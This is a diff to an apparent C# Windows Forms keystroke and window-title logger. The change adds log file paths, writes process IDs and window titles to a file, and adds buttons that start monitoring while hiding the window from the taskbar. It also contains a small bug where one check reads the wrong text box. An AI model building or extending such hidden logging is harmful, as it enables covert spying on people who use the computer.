@@ -25,18 +25,17 @@ namespace WindowsFormsApp_07._03._25
         public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid); //извлекает ID процесса текущего окна
 
         public String buf = "";
-           
+        public String buf2 = "";
+        public String puth1 = "./text_file1.txt";
+        public String puth2 = "./text_file2.txt";
+
         public Form1()
         {
             InitializeComponent();
 
-            // Запускаются два таймера для параллельного мониторинга
             // Определяется текущая локаль системы
             // Сохраняются код языка и его название
-
-            timer1.Start();  // Мониторинг клавиатуры
-            timer2.Start();  // Отслеживание окон
-
+                       
             CultureInfo culture = CultureInfo.CurrentCulture;
 
             string languageCode = culture.TwoLetterISOLanguageName;
@@ -88,6 +87,7 @@ namespace WindowsFormsApp_07._03._25
             GetWindowThreadProcessId(h, ref pid);   // Получаем ID процесса
             Process p = Process.GetProcessById(pid);     // Находим процесс
             richTextBox2.Text += "id {" + p.Id + "}" + " TITLE: {" + p.MainWindowTitle + "}\n";
+            WriteToTxt2("id {" + p.Id + "}" + " TITLE: {" + p.MainWindowTitle + "}\n");
 
         }
 
@@ -98,8 +98,63 @@ namespace WindowsFormsApp_07._03._25
             // Использует режим добавления(append mode)
             // Закрывает поток после записи
 
-            StreamWriter stream = new StreamWriter("./logger.txt", true);
+            StreamWriter stream = new StreamWriter(puth1, true);
             stream.Write(value);
-            stream.Close();        }
+            stream.Close();     
+            
+        }
+
+        private void WriteToTxt2(string value)
+        {
+            StreamWriter stream = new StreamWriter(puth2, true);
+            stream.Write(value);
+            stream.Close();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            this.FormBorderStyle = FormBorderStyle.None;
+            //this.Width = 0;
+            //this.Height = 0;
+            this.ShowInTaskbar = false;
+
+            if (textBox1.Text != "")
+                puth1 = textBox1.Text;
+
+            if (textBox1.Text != "")
+                puth2 = textBox2.Text;
+
+            if (checkBox1.Checked)
+                timer1.Start();
+
+            if (checkBox2.Checked)
+                timer2.Start();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            if (textBox1.Text != "")
+                puth1 = textBox1.Text;
+
+            if (textBox1.Text != "")
+                puth2 = textBox2.Text;
+
+            if (checkBox1.Checked)
+                timer1.Start();
+
+            if (checkBox2.Checked)
+                timer2.Start();
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            this.FormBorderStyle = FormBorderStyle.Sizable;
+
+            if (checkBox1.Checked)
+                timer1.Stop();
+
+            if (checkBox2.Checked)
+                timer2.Stop();
+        }
     }
 }
